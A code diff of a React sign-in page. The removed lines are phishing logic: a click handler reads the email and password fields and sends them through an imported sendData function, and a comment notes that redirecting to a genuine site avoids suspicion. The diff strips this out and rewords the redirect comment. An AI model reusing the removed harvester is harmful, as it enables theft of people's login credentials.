@@ -1,6 +1,5 @@
 import './App.css'
 import './signin.css'
-import { sendData } from '../services/ApiServices';
 
 
 // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -8,23 +7,9 @@ import { sendData } from '../services/ApiServices';
 // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 function App() {
 
-  // The genuine website address to redirect the user (avoids suspicions) :
-  const redirectUrl = 'https://duckduckgo.com/';  
+  // The next webpage to redirect the user after logging in :
+  const redirectUrl = 'https://www.google.com/'; 
 
-  // Website button click event :
-  const handleClick2 = () => {
-
-    var input_email     = document.getElementById('floatingInput').value
-    var input_password  = document.getElementById('floatingPassword').value
-
-    // Save data only if inputs are available :
-    if(input_email != "" && input_password !="" && input_email.includes("@"))
-    {
-      sendData(input_email,input_password);
-    }  
-  };
-
-  
 
   return (
 
@@ -71,7 +56,7 @@ function App() {
 
 
               {/* SIGN-IN BUTTON */}
-              <button className="w-100 btn btn-lg btn-primary mb-5" type="submit" onClick={handleClick2} >Sign in</button>
+              <button className="w-100 btn btn-lg btn-primary mb-5" type="submit" >Sign in</button>
 
             </form>
 
